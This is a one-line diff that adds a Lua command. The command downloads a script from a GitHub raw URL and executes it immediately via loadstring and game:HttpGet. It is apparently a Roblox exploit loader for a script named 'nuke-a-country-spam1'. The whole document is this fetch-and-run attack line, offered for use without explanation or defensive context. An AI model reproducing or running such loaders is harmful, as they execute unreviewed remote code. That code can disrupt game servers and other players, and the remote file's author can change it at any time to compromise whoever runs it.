@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/nuke-a-country-spam1-ljhol7pfgu6dd9.lua"))()
